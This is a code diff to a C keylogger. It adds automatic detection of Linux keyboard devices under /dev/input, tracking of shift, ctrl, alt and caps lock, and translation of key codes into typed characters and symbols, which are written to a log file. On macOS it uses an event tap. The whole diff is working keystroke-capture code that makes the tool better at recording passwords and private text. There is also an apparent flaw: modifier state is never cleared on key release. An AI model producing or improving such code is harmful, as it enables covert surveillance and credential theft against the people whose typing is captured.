@@ -7,9 +7,11 @@
 #include <unistd.h>
 
 #ifdef __linux__
+#include <dirent.h>
 #include <fcntl.h>
 #include <linux/input.h>
 #include <poll.h>
+#include <sys/ioctl.h>
 #elif defined(__APPLE__)
 #include <ApplicationServices/ApplicationServices.h>
 #include <Carbon/Carbon.h>
@@ -21,6 +23,9 @@ static void format_key_token(unsigned int keycode, char *token, size_t token_len
 
 #ifdef __linux__
 static void *linux_keylogger_thread(void *arg);
+static void linux_update_modifiers(keylogger_state_t *state, unsigned int keycode, int value);
+static char linux_apply_shift(keylogger_state_t *state, unsigned int keycode);
+static int linux_is_keyboard_device(const char *device_path);
 #elif defined(__APPLE__)
 static CGEventRef macos_keylogger_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
 static void *macos_keylogger_thread(void *arg);
@@ -46,6 +51,21 @@ void keylogger_state_destroy(keylogger_state_t *state) {
 
 const char *keylogger_platform_default_device(void) {
 #ifdef __linux__
+    static char device_path[KEYLOGGER_DEVICE_MAX] = {0};
+    static int scanned = 0;
+
+    if (!scanned) {
+        if (keylogger_find_keyboard_device(device_path, sizeof(device_path)) == 0) {
+            scanned = 1;
+            return device_path;
+        }
+        scanned = 1;
+        return "/dev/input/event0";
+    }
+
+    if (device_path[0] != '\0') {
+        return device_path;
+    }
     return "/dev/input/event0";
 #elif defined(__APPLE__)
     return "event-tap";
@@ -53,6 +73,104 @@ const char *keylogger_platform_default_device(void) {
     return "unsupported";
 #endif
 }
+
+#ifdef __linux__
+static int linux_is_keyboard_device(const char *device_path) {
+    unsigned long evbit[BITS_TO_LONGS(EV_CNT)];
+    unsigned long keybit[BITS_TO_LONGS(KEY_CNT)];
+    int fd;
+    int ret = 0;
+
+    fd = open(device_path, O_RDONLY | O_NONBLOCK);
+    if (fd < 0) {
+        return 0;
+    }
+
+    memset(evbit, 0, sizeof(evbit));
+    memset(keybit, 0, sizeof(keybit));
+
+    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0) {
+        close(fd);
+        return 0;
+    }
+
+    if (!(evbit[0] & (1 << EV_KEY))) {
+        close(fd);
+        return 0;
+    }
+
+    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0) {
+        close(fd);
+        return 0;
+    }
+
+    if (keybit[BTN_LEFT / BITS_PER_LONG] & (1UL << (BTN_LEFT % BITS_PER_LONG))) {
+        close(fd);
+        return 0;
+    }
+
+    if (keybit[KEY_A / BITS_PER_LONG] & (1UL << (KEY_A % BITS_PER_LONG))) {
+        ret = 1;
+    }
+
+    close(fd);
+    return ret;
+}
+
+int keylogger_find_keyboard_device(char *device_out, size_t device_out_len) {
+    const char *by_path_dirs[] = {
+        "/dev/input/by-path",
+        "/dev/input/by-id",
+        NULL
+    };
+    DIR *dir;
+    struct dirent *entry;
+    char path_buf[KEYLOGGER_DEVICE_MAX];
+    int i;
+    int found = 0;
+
+    for (i = 0; by_path_dirs[i] != NULL && !found; i++) {
+        dir = opendir(by_path_dirs[i]);
+        if (dir == NULL) {
+            continue;
+        }
+
+        while ((entry = readdir(dir)) != NULL && !found) {
+            if (entry->d_name[0] == '.') {
+                continue;
+            }
+
+            if (strstr(entry->d_name, "-kbd") != NULL ||
+                strstr(entry->d_name, "-keyboard") != NULL ||
+                strstr(entry->d_name, "Keyboard") != NULL) {
+
+                snprintf(path_buf, sizeof(path_buf), "%s/%s", by_path_dirs[i], entry->d_name);
+
+                if (linux_is_keyboard_device(path_buf)) {
+                    snprintf(device_out, device_out_len, "%s", path_buf);
+                    found = 1;
+                }
+            }
+        }
+
+        closedir(dir);
+    }
+
+    if (!found) {
+        for (i = 0; i < 32; i++) {
+            snprintf(path_buf, sizeof(path_buf), "/dev/input/event%d", i);
+
+            if (linux_is_keyboard_device(path_buf)) {
+                snprintf(device_out, device_out_len, "%s", path_buf);
+                found = 1;
+                break;
+            }
+        }
+    }
+
+    return found ? 0 : -1;
+}
+#endif
 
 int keylogger_start(
     keylogger_state_t *state,
@@ -91,6 +209,14 @@ int keylogger_start(
         state->log_fp = NULL;
         return -1;
     }
+
+    state->mod_state.lshift = 0;
+    state->mod_state.rshift = 0;
+    state->mod_state.lctrl = 0;
+    state->mod_state.rctrl = 0;
+    state->mod_state.lalt = 0;
+    state->mod_state.ralt = 0;
+    state->mod_state.caps_lock = 0;
 #elif defined(__APPLE__)
     state->event_tap = CGEventTapCreate(
         kCGSessionEventTap,
@@ -232,299 +358,213 @@ static void keylogger_write_marker(keylogger_state_t *state, const char *action)
     keylogger_write_token(state, line);
 }
 
+#ifdef __linux__
+static void linux_update_modifiers(keylogger_state_t *state, unsigned int keycode, int value) {
+    int pressed = (value == 1);
+
+    switch (keycode) {
+    case KEY_LEFTSHIFT:  state->mod_state.lshift = pressed; break;
+    case KEY_RIGHTSHIFT: state->mod_state.rshift = pressed; break;
+    case KEY_LEFTCTRL:   state->mod_state.lctrl = pressed; break;
+    case KEY_RIGHTCTRL:  state->mod_state.rctrl = pressed; break;
+    case KEY_LEFTALT:    state->mod_state.lalt = pressed; break;
+    case KEY_RIGHTALT:   state->mod_state.ralt = pressed; break;
+    case KEY_CAPSLOCK:
+        if (pressed) {
+            state->mod_state.caps_lock = !state->mod_state.caps_lock;
+        }
+        break;
+    default:
+        break;
+    }
+}
+
+static char linux_apply_shift(keylogger_state_t *state, unsigned int keycode) {
+    int shift_on = state->mod_state.lshift || state->mod_state.rshift;
+    int caps_on = state->mod_state.caps_lock;
+
+    switch (keycode) {
+    case KEY_A: return (shift_on ^ caps_on) ? 'A' : 'a';
+    case KEY_B: return (shift_on ^ caps_on) ? 'B' : 'b';
+    case KEY_C: return (shift_on ^ caps_on) ? 'C' : 'c';
+    case KEY_D: return (shift_on ^ caps_on) ? 'D' : 'd';
+    case KEY_E: return (shift_on ^ caps_on) ? 'E' : 'e';
+    case KEY_F: return (shift_on ^ caps_on) ? 'F' : 'f';
+    case KEY_G: return (shift_on ^ caps_on) ? 'G' : 'g';
+    case KEY_H: return (shift_on ^ caps_on) ? 'H' : 'h';
+    case KEY_I: return (shift_on ^ caps_on) ? 'I' : 'i';
+    case KEY_J: return (shift_on ^ caps_on) ? 'J' : 'j';
+    case KEY_K: return (shift_on ^ caps_on) ? 'K' : 'k';
+    case KEY_L: return (shift_on ^ caps_on) ? 'L' : 'l';
+    case KEY_M: return (shift_on ^ caps_on) ? 'M' : 'm';
+    case KEY_N: return (shift_on ^ caps_on) ? 'N' : 'n';
+    case KEY_O: return (shift_on ^ caps_on) ? 'O' : 'o';
+    case KEY_P: return (shift_on ^ caps_on) ? 'P' : 'p';
+    case KEY_Q: return (shift_on ^ caps_on) ? 'Q' : 'q';
+    case KEY_R: return (shift_on ^ caps_on) ? 'R' : 'r';
+    case KEY_S: return (shift_on ^ caps_on) ? 'S' : 's';
+    case KEY_T: return (shift_on ^ caps_on) ? 'T' : 't';
+    case KEY_U: return (shift_on ^ caps_on) ? 'U' : 'u';
+    case KEY_V: return (shift_on ^ caps_on) ? 'V' : 'v';
+    case KEY_W: return (shift_on ^ caps_on) ? 'W' : 'w';
+    case KEY_X: return (shift_on ^ caps_on) ? 'X' : 'x';
+    case KEY_Y: return (shift_on ^ caps_on) ? 'Y' : 'y';
+    case KEY_Z: return (shift_on ^ caps_on) ? 'Z' : 'z';
+    case KEY_1: return shift_on ? '!' : '1';
+    case KEY_2: return shift_on ? '@' : '2';
+    case KEY_3: return shift_on ? '#' : '3';
+    case KEY_4: return shift_on ? '$' : '4';
+    case KEY_5: return shift_on ? '%' : '5';
+    case KEY_6: return shift_on ? '^' : '6';
+    case KEY_7: return shift_on ? '&' : '7';
+    case KEY_8: return shift_on ? '*' : '8';
+    case KEY_9: return shift_on ? '(' : '9';
+    case KEY_0: return shift_on ? ')' : '0';
+    case KEY_MINUS:      return shift_on ? '_' : '-';
+    case KEY_EQUAL:      return shift_on ? '+' : '=';
+    case KEY_LEFTBRACE:  return shift_on ? '{' : '[';
+    case KEY_RIGHTBRACE: return shift_on ? '}' : ']';
+    case KEY_BACKSLASH:  return shift_on ? '|' : '\\';
+    case KEY_SEMICOLON:  return shift_on ? ':' : ';';
+    case KEY_APOSTROPHE: return shift_on ? '"' : '\'';
+    case KEY_COMMA:      return shift_on ? '<' : ',';
+    case KEY_DOT:        return shift_on ? '>' : '.';
+    case KEY_SLASH:      return shift_on ? '?' : '/';
+    case KEY_GRAVE:      return shift_on ? '~' : '`';
+    default: return '\0';
+    }
+}
+#endif
+
 static void format_key_token(unsigned int keycode, char *token, size_t token_len) {
     switch (keycode) {
 #ifdef __linux__
-        case KEY_A:
-#elif defined(__APPLE__)
-        case kVK_ANSI_A:
-#endif
-            snprintf(token, token_len, "a");
-            break;
-#ifdef __linux__
-        case KEY_B:
-#elif defined(__APPLE__)
-        case kVK_ANSI_B:
-#endif
-            snprintf(token, token_len, "b");
-            break;
-#ifdef __linux__
-        case KEY_C:
-#elif defined(__APPLE__)
-        case kVK_ANSI_C:
-#endif
-            snprintf(token, token_len, "c");
-            break;
-#ifdef __linux__
-        case KEY_D:
-#elif defined(__APPLE__)
-        case kVK_ANSI_D:
-#endif
-            snprintf(token, token_len, "d");
-            break;
-#ifdef __linux__
-        case KEY_E:
-#elif defined(__APPLE__)
-        case kVK_ANSI_E:
-#endif
-            snprintf(token, token_len, "e");
-            break;
-#ifdef __linux__
-        case KEY_F:
-#elif defined(__APPLE__)
-        case kVK_ANSI_F:
-#endif
-            snprintf(token, token_len, "f");
-            break;
-#ifdef __linux__
-        case KEY_G:
-#elif defined(__APPLE__)
-        case kVK_ANSI_G:
-#endif
-            snprintf(token, token_len, "g");
-            break;
-#ifdef __linux__
-        case KEY_H:
-#elif defined(__APPLE__)
-        case kVK_ANSI_H:
-#endif
-            snprintf(token, token_len, "h");
-            break;
-#ifdef __linux__
-        case KEY_I:
-#elif defined(__APPLE__)
-        case kVK_ANSI_I:
-#endif
-            snprintf(token, token_len, "i");
-            break;
-#ifdef __linux__
-        case KEY_J:
-#elif defined(__APPLE__)
-        case kVK_ANSI_J:
-#endif
-            snprintf(token, token_len, "j");
-            break;
-#ifdef __linux__
-        case KEY_K:
-#elif defined(__APPLE__)
-        case kVK_ANSI_K:
-#endif
-            snprintf(token, token_len, "k");
-            break;
-#ifdef __linux__
-        case KEY_L:
-#elif defined(__APPLE__)
-        case kVK_ANSI_L:
-#endif
-            snprintf(token, token_len, "l");
-            break;
-#ifdef __linux__
-        case KEY_M:
-#elif defined(__APPLE__)
-        case kVK_ANSI_M:
-#endif
-            snprintf(token, token_len, "m");
-            break;
-#ifdef __linux__
-        case KEY_N:
-#elif defined(__APPLE__)
-        case kVK_ANSI_N:
-#endif
-            snprintf(token, token_len, "n");
-            break;
-#ifdef __linux__
-        case KEY_O:
-#elif defined(__APPLE__)
-        case kVK_ANSI_O:
-#endif
-            snprintf(token, token_len, "o");
-            break;
-#ifdef __linux__
-        case KEY_P:
-#elif defined(__APPLE__)
-        case kVK_ANSI_P:
-#endif
-            snprintf(token, token_len, "p");
-            break;
-#ifdef __linux__
-        case KEY_Q:
-#elif defined(__APPLE__)
-        case kVK_ANSI_Q:
-#endif
-            snprintf(token, token_len, "q");
-            break;
-#ifdef __linux__
-        case KEY_R:
-#elif defined(__APPLE__)
-        case kVK_ANSI_R:
-#endif
-            snprintf(token, token_len, "r");
-            break;
-#ifdef __linux__
-        case KEY_S:
-#elif defined(__APPLE__)
-        case kVK_ANSI_S:
-#endif
-            snprintf(token, token_len, "s");
-            break;
-#ifdef __linux__
-        case KEY_T:
-#elif defined(__APPLE__)
-        case kVK_ANSI_T:
-#endif
-            snprintf(token, token_len, "t");
-            break;
-#ifdef __linux__
-        case KEY_U:
-#elif defined(__APPLE__)
-        case kVK_ANSI_U:
-#endif
-            snprintf(token, token_len, "u");
-            break;
-#ifdef __linux__
-        case KEY_V:
-#elif defined(__APPLE__)
-        case kVK_ANSI_V:
-#endif
-            snprintf(token, token_len, "v");
-            break;
-#ifdef __linux__
-        case KEY_W:
-#elif defined(__APPLE__)
-        case kVK_ANSI_W:
-#endif
-            snprintf(token, token_len, "w");
-            break;
-#ifdef __linux__
-        case KEY_X:
-#elif defined(__APPLE__)
-        case kVK_ANSI_X:
-#endif
-            snprintf(token, token_len, "x");
-            break;
-#ifdef __linux__
-        case KEY_Y:
-#elif defined(__APPLE__)
-        case kVK_ANSI_Y:
-#endif
-            snprintf(token, token_len, "y");
-            break;
-#ifdef __linux__
-        case KEY_Z:
-#elif defined(__APPLE__)
-        case kVK_ANSI_Z:
-#endif
-            snprintf(token, token_len, "z");
-            break;
-#ifdef __linux__
-        case KEY_0:
-#elif defined(__APPLE__)
-        case kVK_ANSI_0:
-#endif
-            snprintf(token, token_len, "0");
-            break;
-#ifdef __linux__
-        case KEY_1:
-#elif defined(__APPLE__)
-        case kVK_ANSI_1:
-#endif
-            snprintf(token, token_len, "1");
-            break;
-#ifdef __linux__
-        case KEY_2:
-#elif defined(__APPLE__)
-        case kVK_ANSI_2:
-#endif
-            snprintf(token, token_len, "2");
-            break;
-#ifdef __linux__
-        case KEY_3:
-#elif defined(__APPLE__)
-        case kVK_ANSI_3:
-#endif
-            snprintf(token, token_len, "3");
-            break;
-#ifdef __linux__
-        case KEY_4:
-#elif defined(__APPLE__)
-        case kVK_ANSI_4:
-#endif
-            snprintf(token, token_len, "4");
-            break;
-#ifdef __linux__
-        case KEY_5:
-#elif defined(__APPLE__)
-        case kVK_ANSI_5:
-#endif
-            snprintf(token, token_len, "5");
-            break;
-#ifdef __linux__
-        case KEY_6:
-#elif defined(__APPLE__)
-        case kVK_ANSI_6:
-#endif
-            snprintf(token, token_len, "6");
-            break;
-#ifdef __linux__
-        case KEY_7:
-#elif defined(__APPLE__)
-        case kVK_ANSI_7:
-#endif
-            snprintf(token, token_len, "7");
-            break;
-#ifdef __linux__
-        case KEY_8:
-#elif defined(__APPLE__)
-        case kVK_ANSI_8:
-#endif
-            snprintf(token, token_len, "8");
-            break;
-#ifdef __linux__
-        case KEY_9:
-#elif defined(__APPLE__)
-        case kVK_ANSI_9:
-#endif
-            snprintf(token, token_len, "9");
-            break;
-#ifdef __linux__
         case KEY_SPACE:
+        case KEY_ENTER:
+        case KEY_TAB:
+        case KEY_BACKSPACE:
+        case KEY_ESC:
+        case KEY_LEFT:
+        case KEY_RIGHT:
+        case KEY_UP:
+        case KEY_DOWN:
+        case KEY_HOME:
+        case KEY_END:
+        case KEY_PAGEUP:
+        case KEY_PAGEDOWN:
+        case KEY_INSERT:
+        case KEY_DELETE:
+        case KEY_F1:
+        case KEY_F2:
+        case KEY_F3:
+        case KEY_F4:
+        case KEY_F5:
+        case KEY_F6:
+        case KEY_F7:
+        case KEY_F8:
+        case KEY_F9:
+        case KEY_F10:
+        case KEY_F11:
+        case KEY_F12:
+            break;
 #elif defined(__APPLE__)
         case kVK_Space:
-#endif
-            snprintf(token, token_len, " ");
-            break;
-#ifdef __linux__
-        case KEY_ENTER:
-#elif defined(__APPLE__)
         case kVK_Return:
-#endif
-            snprintf(token, token_len, "\n");
-            break;
-#ifdef __linux__
-        case KEY_TAB:
-#elif defined(__APPLE__)
         case kVK_Tab:
-#endif
-            snprintf(token, token_len, "\t");
-            break;
-#ifdef __linux__
-        case KEY_BACKSPACE:
-#elif defined(__APPLE__)
         case kVK_Delete:
-#endif
-            snprintf(token, token_len, "[BACKSPACE]");
-            break;
-#ifdef __linux__
-        case KEY_ESC:
-#elif defined(__APPLE__)
         case kVK_Escape:
-#endif
-            snprintf(token, token_len, "[ESC]");
+        case kVK_LeftArrow:
+        case kVK_RightArrow:
+        case kVK_UpArrow:
+        case kVK_DownArrow:
+        case kVK_Home:
+        case kVK_End:
+        case kVK_PageUp:
+        case kVK_PageDown:
+        case kVK_ForwardDelete:
+        case kVK_F1:
+        case kVK_F2:
+        case kVK_F3:
+        case kVK_F4:
+        case kVK_F5:
+        case kVK_F6:
+        case kVK_F7:
+        case kVK_F8:
+        case kVK_F9:
+        case kVK_F10:
+        case kVK_F11:
+        case kVK_F12:
             break;
+#else
+            break;
+#endif
         default:
             snprintf(token, token_len, "[KEY_%u]", keycode);
-            break;
+            return;
     }
+
+#ifdef __linux__
+    switch (keycode) {
+        case KEY_SPACE:     snprintf(token, token_len, " ");          break;
+        case KEY_ENTER:     snprintf(token, token_len, "\n");         break;
+        case KEY_TAB:       snprintf(token, token_len, "\t");         break;
+        case KEY_BACKSPACE: snprintf(token, token_len, "[BACKSPACE]"); break;
+        case KEY_ESC:       snprintf(token, token_len, "[ESC]");      break;
+        case KEY_LEFT:      snprintf(token, token_len, "[LEFT]");     break;
+        case KEY_RIGHT:     snprintf(token, token_len, "[RIGHT]");    break;
+        case KEY_UP:        snprintf(token, token_len, "[UP]");       break;
+        case KEY_DOWN:      snprintf(token, token_len, "[DOWN]");     break;
+        case KEY_HOME:      snprintf(token, token_len, "[HOME]");     break;
+        case KEY_END:       snprintf(token, token_len, "[END]");      break;
+        case KEY_PAGEUP:    snprintf(token, token_len, "[PGUP]");     break;
+        case KEY_PAGEDOWN:  snprintf(token, token_len, "[PGDN]");     break;
+        case KEY_INSERT:    snprintf(token, token_len, "[INS]");      break;
+        case KEY_DELETE:    snprintf(token, token_len, "[DEL]");      break;
+        case KEY_F1:        snprintf(token, token_len, "[F1]");       break;
+        case KEY_F2:        snprintf(token, token_len, "[F2]");       break;
+        case KEY_F3:        snprintf(token, token_len, "[F3]");       break;
+        case KEY_F4:        snprintf(token, token_len, "[F4]");       break;
+        case KEY_F5:        snprintf(token, token_len, "[F5]");       break;
+        case KEY_F6:        snprintf(token, token_len, "[F6]");       break;
+        case KEY_F7:        snprintf(token, token_len, "[F7]");       break;
+        case KEY_F8:        snprintf(token, token_len, "[F8]");       break;
+        case KEY_F9:        snprintf(token, token_len, "[F9]");       break;
+        case KEY_F10:       snprintf(token, token_len, "[F10]");      break;
+        case KEY_F11:       snprintf(token, token_len, "[F11]");      break;
+        case KEY_F12:       snprintf(token, token_len, "[F12]");      break;
+        default:            snprintf(token, token_len, "[KEY_%u]", keycode); break;
+    }
+#elif defined(__APPLE__)
+    switch (keycode) {
+        case kVK_Space:        snprintf(token, token_len, " ");         break;
+        case kVK_Return:       snprintf(token, token_len, "\n");        break;
+        case kVK_Tab:          snprintf(token, token_len, "\t");        break;
+        case kVK_Delete:       snprintf(token, token_len, "[BACKSPACE]");break;
+        case kVK_Escape:       snprintf(token, token_len, "[ESC]");     break;
+        case kVK_LeftArrow:    snprintf(token, token_len, "[LEFT]");    break;
+        case kVK_RightArrow:   snprintf(token, token_len, "[RIGHT]");   break;
+        case kVK_UpArrow:      snprintf(token, token_len, "[UP]");      break;
+        case kVK_DownArrow:    snprintf(token, token_len, "[DOWN]");    break;
+        case kVK_Home:         snprintf(token, token_len, "[HOME]");    break;
+        case kVK_End:          snprintf(token, token_len, "[END]");     break;
+        case kVK_PageUp:       snprintf(token, token_len, "[PGUP]");    break;
+        case kVK_PageDown:     snprintf(token, token_len, "[PGDN]");    break;
+        case kVK_ForwardDelete:snprintf(token, token_len, "[DEL]");     break;
+        case kVK_F1:           snprintf(token, token_len, "[F1]");      break;
+        case kVK_F2:           snprintf(token, token_len, "[F2]");      break;
+        case kVK_F3:           snprintf(token, token_len, "[F3]");      break;
+        case kVK_F4:           snprintf(token, token_len, "[F4]");      break;
+        case kVK_F5:           snprintf(token, token_len, "[F5]");      break;
+        case kVK_F6:           snprintf(token, token_len, "[F6]");      break;
+        case kVK_F7:           snprintf(token, token_len, "[F7]");      break;
+        case kVK_F8:           snprintf(token, token_len, "[F8]");      break;
+        case kVK_F9:           snprintf(token, token_len, "[F9]");      break;
+        case kVK_F10:          snprintf(token, token_len, "[F10]");     break;
+        case kVK_F11:          snprintf(token, token_len, "[F11]");     break;
+        case kVK_F12:          snprintf(token, token_len, "[F12]");     break;
+        default:               snprintf(token, token_len, "[KEY_%u]", keycode); break;
+    }
+#endif
 }
 
 #ifdef __linux__
@@ -563,9 +603,17 @@ static void *linux_keylogger_thread(void *arg) {
 
         while (read(poll_fd.fd, &event, sizeof(event)) == (ssize_t)sizeof(event)) {
             if (event.type == EV_KEY && (event.value == 1 || event.value == 2)) {
-                char token[32];
+                linux_update_modifiers(state, event.code, event.value);
 
-                format_key_token(event.code, token, sizeof(token));
+                char shifted = linux_apply_shift(state, event.code);
+                char token[64];
+
+                if (shifted != '\0') {
+                    snprintf(token, sizeof(token), "%c", shifted);
+                } else {
+                    format_key_token(event.code, token, sizeof(token));
+                }
+
                 keylogger_write_token(state, token);
             }
         }
